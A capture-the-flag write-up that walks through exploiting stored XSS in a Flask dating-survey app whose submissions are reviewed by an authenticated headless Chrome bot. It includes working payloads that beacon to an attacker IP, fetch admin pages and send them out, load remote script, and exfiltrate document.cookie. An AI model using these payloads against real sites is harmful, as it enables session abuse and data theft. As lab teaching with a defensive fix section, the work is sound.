---
description: "Cupid's Matchmaker — a dating-survey app whose landing page insists, three times, that real humans read every submission. They don't: the reviewer is a headless Chrome bot that opens the admin panel every 71 seconds. Stored XSS in the survey form runs inside its authenticated session. Includes the listener that never started and looked exactly like a failed exploit, the content sweep that structurally could not find the page that mattered, and the assumption about HttpOnly that nearly cost the flag."
---

# Cupid's Matchmaker — the human matchmaking team is a headless browser

**Challenge: Cupid's Matchmaker · target: `10.x.x.x:5000` (the lab IP changes every time you start the box)**

> **The flag is redacted** here as `THM{[redacted]}`. Everything that teaches stays: every command
> with every flag explained, the real output, the controls that prove each result, the exact payloads,
> all three wrong turns, and the teardown. The flag string itself teaches nothing — it is just proof
> you were there, and publishing it hands the room's answer to the next person instead of letting
> them earn it.
>
> **What I kept and why:** the payloads, the endpoint names (`/admin/submissions`,
> `/admin/mark_reviewed/<id>`), the field names, the cookie *name* (`flag`) and the bot's User-Agent
> are *method*, not prize. Redacting those would leave a write-up that teaches nothing.

**The brief, as the room gives it:**

> My Dearest Hacker, Tired of soulless algorithms? At Cupid's Matchmaker, real humans read your
> personality survey and personally match you with compatible singles. Our dedicated matchmaking team
> reviews every submission to ensure you find true love this Valentine's Day! 💘
> **No algorithms. No AI. Just genuine human connection.**

Hold onto that last line. It is the whole joke, and the answer is in it.

---

## What the brief tells you before you send a single request

The room says one thing three separate times: **a human being reads what you submit.**

Read that as an attacker. If someone opens a page containing your text, then your text is not just
data sitting in a database — it is **content being rendered inside somebody else's browser**. And in
a lab, "a human reads it" is almost always a *headless browser*: a real browser with no visible
window, driven by a script, logged in as staff, opening the review page on a timer.

That is the setup for **stored XSS**. Let me unpack that term completely, because the rest of this
write-up depends on it:

- **XSS** stands for **Cross-Site Scripting**: getting a website to treat your input as *code* rather
  than as *text*. If you type `<b>hello</b>` into a comment box and the page shows a **bold hello**
  instead of the literal characters `<b>hello</b>`, the site is putting your input into the page's
  HTML without neutralising it. If `<b>` works, `<script>` works too.
- **Stored** (or *persistent*) means the site saves your input and serves it to **other people**
  later. That is far more dangerous than the reflected kind, which only affects whoever clicks your
  crafted link. Stored XSS waits patiently in the database for a privileged user to walk past.
- The fix, universally, is **output escaping**: converting `<` into `&lt;` before printing, so the
  browser draws the characters instead of obeying them.

So the hypothesis before touching anything: *the survey form is a stored XSS delivery mechanism aimed
at whoever reviews submissions.* A hypothesis shapes what you look for. It does not let you skip
looking.

**Second hypothesis, from the port number.** Port 5000 is the default for **Flask**, a Python web
framework. Flask builds pages with the **Jinja2** template engine, which makes **SSTI** worth one
cheap probe. SSTI is **Server-Side Template Injection**: if the server treats your input as *template*
code, then `{{7*7}}` comes back as `49`, and from there you can usually reach the operating system.

---

## Step 1 — Is the box up, and what else is on it?

```bash
ping -c 2 -W 3 10.x.x.x
```

- `-c 2` — send exactly 2 packets and stop. Without it, `ping` runs forever.
- `-W 3` — wait at most 3 seconds for a reply.

Both replies came back at ~20 ms with `ttl=62`.

**Why `ttl` is worth a glance.** TTL ("time to live") is a counter inside every IP packet that drops
by one at each router the packet crosses. Linux hosts start it at 64, Windows at 128. A reply arriving
at 62 started at 64 and crossed two routers — so the target is almost certainly **Linux**, two hops
away. That is free operating-system intelligence from a command you were running anyway.

```bash
nmap -sT -Pn -p- --min-rate 2000 -oN nmap-allports.txt 10.x.x.x
```

A **port** is a numbered door on a machine; each network service listens on one. A port scanner knocks
on doors and notes which ones answer.

- `-sT` — **TCP connect scan**: complete a full connection to each port. The stealthier `-sS` needs
  root privileges, and this session had none. Know which of your tools need root *before* you queue a
  long job behind one.
- `-Pn` — skip the "is this host alive" ping check. I already proved it is alive; without this flag, a
  host that blocks ping gets wrongly written off as dead.
- `-p-` — scan **all 65,535 ports**, not just nmap's default top 1,000. Rooms love a service on a high
  port.
- `--min-rate 2000` — send at least 2,000 packets per second. The full sweep finished in 7 seconds.
- `-oN file` — save human-readable output. Always keep the evidence.

| Port | Service | Verdict |
|---|---|---|
| 22 | SSH | Remote login. No credentials, nothing to do with it yet. |
| 631 | IPP | CUPS, the Linux printing service. Nearly always noise on a lab box. |
| 5000 | nmap says "upnp" | **Wrong.** This is the web app. |

Nmap guessed "upnp" purely from the port number in a static lookup table. **A service label is a
guess; the banner is the evidence** — and the banner, one command later, says Python.

## Step 2 — Read the application before poking it

```bash
curl -sS -i -o index-raw.txt -w 'HTTP %{http_code} size=%{size_download}\n' http://10.x.x.x:5000/
```

- `-sS` — silent, **but still show errors**. Plain `-s` hides failures too, which has previously cost
  me an upload that silently never left my machine. `-sS` is the pairing you want, always.
- `-i` — include the response headers. Headers are where servers confess.
- `-o file` / `-w '...'` — save the body; print a summary line of my own design.

```
Server: Werkzeug/3.0.1 Python/3.12.3
Vary: Cookie
```

**Werkzeug** is the engine underneath Flask. That confirms the guess from the port number, and it
means pages are rendered by Jinja2 — keep SSTI on the list. `Vary: Cookie` means the HTML changes
depending on your cookie, so **there is a logged-in state somewhere** in this app.

The page has **no `<script>` tags at all** and links a single stylesheet. There is no client-side
JavaScript to read. Everything of interest happens server-side.

## Step 3 — Map the endpoints

```bash
for p in survey login register admin; do
  curl -sS -o "page-$p.html" -w 'HTTP %{http_code} size=%{size_download} loc=%{redirect_url}\n' \
    "http://10.x.x.x:5000/$p"
done
```

| Path | Response | Reading |
|---|---|---|
| `/survey` | 200 | The public form. |
| `/login` | 200 | "🔐 Admin Login — Matchmaking team members only". |
| `/register` | 404 | No self-service accounts. |
| `/admin` | **302 → `/login`** | An admin area exists, gated by a session check. |

A **302** is a redirect: "not here, go there instead." Getting bounced to `/login` tells you the page
exists and wants a session — which is more information than a 404 would have given.

The survey form posts to itself and has eight fields: `name`, `age`, `gender`, `seeking`,
`ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`. Two are dropdowns and one is
numeric, so **five free-text fields** are the attack surface. There is **no CSRF token** anywhere.

And printed on the form itself, the line that names the entire challenge:

> 📋 Our team typically reviews submissions within a minute.

**Something opens the admin page about once a minute and looks at my text.** That is not a marketing
promise, that is a schedule.

## Step 4 — One honest submission first

Before any payload, submit a normal survey, so you know exactly what "normal" looks like. Everything
you measure later is measured against this.

```bash
curl -sS -c jar.txt -D headers.txt -X POST http://10.x.x.x:5000/survey \
  --data-urlencode 'name=Alex' --data-urlencode 'age=29' \
  --data-urlencode 'gender=Male' --data-urlencode 'seeking=Female' \
  --data-urlencode 'ideal_date=A quiet dinner then a long walk by the river.' \
  --data-urlencode 'describe_yourself=Curious, calm, bookish' \
  --data-urlencode 'looking_for=Someone kind who likes museums and bad puns.' \
  --data-urlencode 'dealbreakers=None really.'
```

- `-X POST` — send a POST request (submitting a form) rather than the default GET (fetching a page).
- `--data-urlencode 'k=v'` — one form field, with the value URL-encoded so spaces and punctuation
  survive the trip. Doing it per field means never hand-escaping anything.
- `-c jar.txt` — save cookies the server sets. `-D file` — dump response headers.

The reply is `302 FOUND` to `/`, plus one header that changes the plan twice:

```
Set-Cookie: session=eyJfZmxhc2hlcyI6...; HttpOnly; Path=/
```

1. That is a **standard Flask session cookie**: base64 of a JSON blob, a dot, then a signature.
   Decoded, mine held only the "Thank you!" message. It is signed with the app's secret key, so I
   cannot forge an admin one — unless I can read that key off the server.
2. **`HttpOnly` is set.** That flag tells the browser: *JavaScript may not read this cookie.* So the
   textbook XSS goal — steal `document.cookie`, replay the session, become the admin — looks dead on
   arrival.

Remember point 2. It is correct, and later it will nearly cost me the flag anyway.

Also note what does **not** come back: no submission ID, no confirmation page, no public listing.
**Nothing on the public side ever shows me my own submission.** Whatever my payload does, it does it
somewhere I cannot see.

## Step 5 — Content discovery, with controls

```bash
grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge|logout)$' \
  /usr/share/wordlists/dirb/common.txt > wl-safe.txt
printf 'survey\nZZZNOSUCHPATHZZZ\n' >> wl-safe.txt
ffuf -u http://10.x.x.x:5000/FUZZ -w wl-safe.txt -t 25 -mc all -fc 404 -s
```

Three things in there are habits worth stealing:

**Strip the destructive words first.** A content sweep is *not* read-only. It issues a real GET to
every path it can name, and re-issues them on every re-run. Names like `reset`, `seed`, `install` and
`delete` are **writes** wearing a noun. On one past engagement an installer endpoint rebuilt the
application's tables mid-assessment, so everything measured afterwards described a database I had
accidentally created. A `GET` is not "safe" because a specification says so.

**Add two control lines.** `survey` is a **positive control** — a path I *know* exists, which must
appear in the results. `ZZZNOSUCHPATHZZZ` is a **negative control** — a path that cannot exist, which
must *not* appear. Read the controls before the results. If the positive control is missing, your
requests are not arriving and an empty result means nothing; if the negative control appears, your
filter is passing everything and every result is noise. Sweeps that quietly failed have produced
confident wrong answers for me more than once — that is the most expensive kind of bug, because it
never looks like a failure.

**The flags:**
- `-u .../FUZZ` — `FUZZ` is the placeholder each wordlist line is substituted into.
- `-t 25` — 25 parallel workers. A one-CPU lab VM falls over at `-t 80`, and then you are debugging
  your own traffic instead of the target.
- `-mc all -fc 404` — **match** all status codes, then **filter out** 404s. Written this way round
  deliberately: ffuf's default match list omits some codes, and its matchers are OR-ed together in a
  way that has produced "everything matched" sweeps before.

Result: `admin`, `login`, `survey`. Controls behaved. **Remember this result — it is wrong, and I will
show you why in step 8.**

I also spent exactly three requests on obvious admin passwords (`admin:admin`, `admin:password`,
`admin:cupid`). All returned 200 with no redirect, meaning failure — a successful login would
redirect. Three requests is a sanity check. Anything beyond that is password guessing, which is the
**worst move available** on an information-per-cost basis: hours of CPU to test one hypothesis that is
almost always false in a designed room, and a negative result that teaches you nothing. Cracking is
the last thing you do, never the next thing.

## Step 6 — The bit most write-ups skip: proving the channel before trusting silence

Here is the situation. My payload will execute somewhere I cannot see, and the application gives me no
public sink to write results into. So the success signal has to travel **out-of-band** — a callback
from the target to a listener on my own machine.

That channel has burned me before. On an earlier room with a bot viewer I fired blind XSS payloads and
sat in silence for an hour. Silence meant *either* "there is no bot", *or* "the payload did not
execute", *or* "my own firewall dropped the callback" — and those are **indistinguishable**. An hour
of nothing taught me nothing.

So, before relying on it, check your own machine, because **your firewall is part of the channel**:

```bash
systemctl is-active ufw                      # -> active
grep DEFAULT_INPUT_POLICY /etc/default/ufw   # -> DROP
dmesg | grep -c 'UFW BLOCK'                  # -> 763
```

Kali ships ufw **active and DROP-by-default**. An inbound connection from the target is dropped before
any listener of mine ever sees it. `sudo ufw allow in on tun0` fixes that — but `sudo -n` reported
that a password was required, and I did not have one.

**Here is the move that makes a negative result meaningful anyway.** `dmesg` is readable *without*
root, and ufw logs every dropped packet along with its source address. So instead of one ambiguous
silence, firing the payload now produces three distinguishable outcomes:

| What I see afterwards | What it means |
|---|---|
| A request in my listener log | The payload fired **and** the channel is open. |
| Nothing in the log, but `UFW BLOCK ... SRC=<target>` in `dmesg` | **The payload fired**; my own firewall ate the proof. Fix the firewall, re-check. |
| Nothing in either place | The payload genuinely did not execute. Change the payload, not the plumbing. |

A blocked SYN packet from the target is **positive proof the exploit worked**. Design your experiment
so that its negative result means exactly one thing — and if it can't, re-engineer it until it can.

## Step 7 — The payload, and what every piece of it tests

One submission, with a **different marker in each field**, so the callback tells me *which* field is
injectable rather than merely "something worked":

```html
<img src="http://192.168.x.x:8000/f-name-{{7*7}}">
```

- `<img src="...">` — an image tag pointing at my machine. A browser fetches an image **without
  needing JavaScript**, so a hit proves my HTML was injected and rendered, *independently* of whether
  scripts run. That separation matters: it splits "HTML injection works" from "JavaScript executes"
  into two findings instead of one guess.
- `f-name` — the per-field marker.
- `{{7*7}}` inside the URL — the **SSTI probe, riding along for free**. If the server renders my input
  as a Jinja2 template, the request arrives as `/f-name-49`. If it merely stores and echoes it, the
  request arrives literally as `/f-name-{{7*7}}`. One payload, two vulnerability classes, and the two
  outcomes are distinguishable at a glance.

Plus one JavaScript payload in the longest field:

```html
<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>fetch('http://192.168.x.x:8000/adm?d='+encodeURIComponent(t.slice(0,1200))))">
```

- `src=x` — a deliberately broken image source, so loading **fails**, which fires...
- `onerror="..."` — ...this handler. It is the standard way to execute JavaScript without a `<script>`
  tag, which many naive filters block.
- `fetch('/admin')` — the reviewer's browser requests the admin page, and **its session cookie is
  attached automatically**. This is the crucial idea: `HttpOnly` stops JavaScript from *reading* the
  cookie, but it does **not** stop the browser from *sending* it. I do not need to steal the session —
  I can simply use it in place. Cookie theft being blocked does not save the application.
- `.slice(0,1200)` and `encodeURIComponent(...)` — send only the first 1,200 characters (URLs have
  length limits) and escape them so they survive as a query string.

### Wrong turn #1: the listener that never started

I started `python3 -m http.server 8000`, checked `ss -ltn | grep :8000`, saw a listening socket,
submitted the payload, and polled for three minutes. Nothing. Then I read the listener's own log:

```
OSError: [Errno 98] Address already in use
```

**The symptom:** an empty log after three minutes, which looks exactly like "the XSS did not fire".
**The real cause:** port 8000 was already held by a leftover `http.server` from an **earlier,
unrelated session**, bound to the same address. My `ss` check printed *that* process's socket, and I
read it as "mine started fine."
**The rule:** `ss -ltn` proves *a* listener exists, not that *your* listener exists. Record the PID at
launch and confirm it with `ss -ltnp`; read the process's own log for a startup error before trusting
it. I verified the property I *wanted* (something is listening) instead of the property I *needed*
(my thing is listening).

It cost nothing — purely by luck, since the squatting listener was bound to exactly the address and
port my payload targeted, so it caught every callback for me. Luck is not a method. The same mistake
with a different port number produces a confident, fabricated "no XSS here."

### What came back

```
"GET /f-name-%7B%7B7*7%7D%7D"          <- name
"GET /f-idealdate-%7B%7B7*7%7D%7D"     <- ideal_date
"GET /f-describe-%7B%7B7*7%7D%7D"      <- describe_yourself
"GET /f-lookingfor-%7B%7B7*7%7D%7D"    <- looking_for
"GET /f-dealbreakers-%7B%7B7*7%7D%7D"  <- dealbreakers
"GET /adm?d=%3C!DOCTYPE%20html%3E..."  <- the JavaScript ran, and sent me a page
```

Five findings from a single submission:

1. **Every free-text field is injectable.** All five markers returned; nothing is escaped anywhere.
2. **JavaScript executes** in the reviewer's browser.
3. **There is no SSTI.** `%7B%7B7*7%7D%7D` is the URL-encoding of a literal `{{7*7}}`. Had the server
   evaluated it, the path would read `f-name-49`. The server stores and echoes; it does not evaluate.
   A whole hypothesis eliminated for zero extra requests.
4. **The bot runs every ~71 seconds** — timestamps 00:04:59, 00:06:11, 00:07:22. A stored payload
   re-fires on every cycle, which is what makes step 9 possible.
5. **The page it sent me was the login page — but its navbar contained `/admin/submissions` and
   `/logout`.** Those links only render for a logged-in visitor. So the bot **is** authenticated, and
   there is a page I never found.

## Step 8 — Wrong turn #2: a sweep that could not possibly have worked

`/admin/submissions` existed the entire time, and my content sweep in step 5 **was structurally
incapable of finding it**. I fuzzed `http://.../FUZZ` — one path level. A second-level path is
invisible to that sweep no matter how good the wordlist is. I had already written "the entire
application is four routes" in my notes: a conclusion my instrument could not support.

**The rule:** when a sweep finds a directory, recurse into it. And ask, before believing any empty
result, whether your instrument could even *express* the thing you are looking for.

Redone properly — and the redirect from step 3 hands you a free oracle. Unauthenticated, an
**existing** admin route answers `302 → /login` while a **missing** one answers `404`. That difference
needs no credentials at all:

```bash
ffuf -u http://10.x.x.x:5000/admin/FUZZ -w wl-safe.txt -t 25 -mc all -fc 404 -s
```

Controls first: `/admin/submissions` → 302 (positive), `/admin/ZZZNOPE` → 404 (negative). Both behaved.
Result: `submissions`, and nothing else.

## Step 9 — A payload you can rewrite without resubmitting

Every submission is stored permanently and re-fires every 71 seconds, so iterating by submitting a
fresh payload each time is slow *and* messy — each copy is another thing you must clean up. Better:
one payload that fetches its instructions from you.

```html
<script src="http://192.168.x.x:8001/p.js"></script>
```

Now editing `p.js` on my own disk changes what the bot does on its next cycle. One stored payload,
unlimited iterations.

**Why `<script src>` and not `fetch(...).then(eval)`?** Reading a cross-origin response with `fetch`
requires the other server to send **CORS** headers (Cross-Origin Resource Sharing — the
`Access-Control-Allow-Origin` header), and `python3 -m http.server` sends none. A classic `<script
src>` include has no such restriction; it predates CORS entirely. That same asymmetry is why
exfiltration works at all: you can freely **send** data cross-origin, you just cannot **read** the
reply. Every payload here is built around sending.

This time I started my listener on **8001** and verified the socket's PID matched the one I recorded —
the fix for wrong turn #1 — and included a control beacon to the old port in the same payload, which
confirmed the firewall was allowing the whole VPN interface rather than one lucky port.

### The authenticated sweep, for free

Inside the bot's browser, `fetch()` carries the bot's session automatically, so you get an
*authenticated* content sweep at no cost:

```js
['/admin','/admin/submissions','/admin/settings','/admin/config','/admin/users','/admin/matches',
 '/admin/dashboard','/admin/export','/admin/flag','/flag','/admin/review','/admin/profile']
 .forEach(p=>fetch(p).then(r=>send('probe','path='+p+' status='+r.status+' url='+r.url)));
```

Everything 404'd except `/admin` and `/admin/submissions`. The submissions page came back in chunks
(13,189 characters, reassembled locally) and contains the seeded singles, my own submissions, a
`/admin/mark_reviewed/<id>` action — **and no flag.**

But the sweep leaked something better than a page. Every response reported:

```
url=http://localhost:5000/admin/submissions
```

**The reviewer browses the app as `localhost`.** The bot runs *on the target host itself*. So I turned
it inward and used the bot as a proxy into the machine's own network stack: `/console` (the Werkzeug
debugger — remote code execution if it is enabled) returned 404, and a sweep of fifteen internal ports
found only 631, which was already visible from outside. No hidden internal service. Both dead ends,
both cheap, both worth knowing.

## Step 10 — Wrong turn #3, the one that nearly cost the flag

Back at step 4 I saw `HttpOnly` on the session cookie and wrote that cookie theft was "off the table."
That was the right answer to the wrong question.

**`HttpOnly` is a flag on one cookie. It is not a property of the site.** I never checked whether the
session cookie was the *only* cookie.

The probe that found the flag was deliberately generic — "what does this browser actually hold?"
rather than "is my theory correct?":

```js
send('env','cookie='+document.cookie+' | UA='+navigator.userAgent);
send('ls','localStorage='+JSON.stringify(localStorage)+' | session='+JSON.stringify(sessionStorage));
```

The reply:

```
cookie=flag=THM{[redacted]} | UA=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36
localStorage={} | session={}
```

**The flag was a second cookie on the same origin, without `HttpOnly`.** `document.cookie` returns
every cookie JavaScript is allowed to read — so the protected session cookie was simply absent from
that string, while the unprotected `flag` cookie sat right there in plain sight.

And the User-Agent closes the joke the room opened with. "No algorithms. No AI. Just genuine human
connection" — the dedicated human matchmaking team is **`HeadlessChrome/144.0.0.0`**.

### Closing the loose end instead of ignoring it

One oddity was still unexplained: `/admin` returned `200` with **login-page content**, even though the
same response's navbar proved the visitor was logged in. Pulling the whole page (1,760 characters)
settled it — the `/admin` route renders the login template unconditionally, while the shared base
template checks the session separately to decide which navbar links to draw. Sloppy application, not a
hidden feature.

It turned out to be nothing. It was still worth checking, because **the anomaly you explain away is
usually the finding.** On a previous room, a `400` response and a `404` response to two nearly
identical inputs sat in my own output for hours while I swept 21,000 route names around them. That
disagreement *was* the SQL injection.

---

## The vulnerability, stated plainly

**Stored cross-site scripting in every free-text field of the public survey form**, rendered unescaped
into a privileged page that an authenticated headless browser opens every ~71 seconds.

Three independent mistakes had to line up:

1. Survey input is stored and rendered **without HTML escaping**.
2. The page it lands in is the **admin panel**, opened by an **authenticated** automated reviewer.
3. The flag lives in a cookie **without `HttpOnly`**, on the same origin.

Break any one link and the chain fails. The cheapest fix is the first: escape output. Jinja2 does this
**by default** — someone had to actively switch it off with `| safe` or `Markup()` to make this
possible. The second cheapest is `HttpOnly` on *every* cookie holding anything sensitive, not just the
session one.

## What I would tell a beginner to take from this room

1. **Read the marketing copy as a threat model.** "Real humans review every submission" and "typically
   within a minute" told me there was a bot, that it was privileged, and how often it ran — before I
   sent a single request.
2. **Design experiments whose negative result means exactly one thing.** Check your own firewall before
   waiting on a callback. `dmesg` turns "silence" into "the exploit worked but I dropped the packet."
3. **Verify the property you need, not the property you want.** "A listener exists" is not "my listener
   exists."
4. **Ask what your instrument is structurally capable of seeing.** A one-level sweep can never find a
   two-level path, no matter how big the wordlist.
5. **`HttpOnly` is per-cookie.** Dump the whole of `document.cookie` and look. Do not reason about
   which cookies "must" be protected.
6. **Send-only exfiltration beats read-back.** Cross-origin `fetch` cannot read replies without CORS,
   but it can always send. Build payloads around that, and use `<script src>` when you need to *pull*
   code in.

## Teardown

Whatever you start, you stop — and stopping is a claim, so it needs evidence.

| Started | Stopped how | Verified by |
|---|---|---|
| `nmap`, two `ffuf` sweeps | ran to completion | absent from `ps` |
| My listener on :8001 | `kill <PID>` — by number, never `pkill -f`, which fails silently | `ss -ltn \| grep -c :8001` → **0**, and `ps -p <PID>` → gone |
| The `p.js` served to the bot | overwrote it with a no-op **before** killing the listener, then confirmed the bot re-fetched it | the fetch count rose, and the last fetch served the neutralised file |

That ordering matters: neutralise the payload first and let the victim pick up the harmless version,
*then* kill the listener. Kill the listener first and a cached copy may keep running.

**The obligation I could not fully discharge, stated plainly:** four of my submissions are stored in
the target's database, three of them carrying payloads. The application has **no delete endpoint** —
the only admin action is `mark_reviewed`, which flips a status flag and removes nothing. So they
persist until the box is reset. Their beacons now fail (my listener is gone) and the script include
serves nothing, but the rows remain. Removing them would need a capability I never obtained, and
saying so is better than implying a clean exit I did not achieve.

**Status of the flag:** read directly out of the application's own cookie jar and captured in my
callback log. It has **not** been submitted to the platform, so it is evidence-backed rather than
confirmed. That distinction is worth keeping honest.
